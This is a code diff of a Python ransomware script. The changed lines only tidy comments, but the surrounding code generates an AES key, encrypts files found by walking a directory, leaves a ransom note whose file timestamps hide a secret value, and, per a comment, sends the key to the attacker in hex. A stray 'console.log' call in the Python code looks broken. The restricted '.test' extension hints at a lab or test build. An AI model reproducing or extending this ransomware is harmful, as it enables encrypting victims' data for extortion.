@@ -162,8 +162,13 @@ def generate_key() -> bytes:
     """
     return secrets.token_bytes(32)
 
-###############################################################################################################################################################################
+
 def write_note(filepath):
+    """
+    
+    leave ransomnote at filepath.
+
+    """
     time.sleep(10)
     time_now = datetime.now(pytz.timezone('US/Eastern'))
     secret = int(time_now.timestamp() * 1e9)
@@ -189,7 +194,7 @@ def write_note(filepath):
     print(f"Randsome note created at {filepath}")
 
     os.utime(filepath, (secret, secret))
-###############################################################################################################################################################################
+
 
 if __name__ == "__main__":
     # Generate a random key for AES-GCM encryption
@@ -200,9 +205,9 @@ if __name__ == "__main__":
     extension_list = [".test"]
     number_of_files_encrypted = encrypt_directory_walk(directory, key, extension_list)
 
-###############################################################################################################################################################################
+    # write ransom note
     write_note(directory) 
-###############################################################################################################################################################################   
+    
     # Send the key to the attacker in an hexadecimal format
     key_hex = key.hex()
     console.log(f"Key was generated: {key_hex[:10]}...")
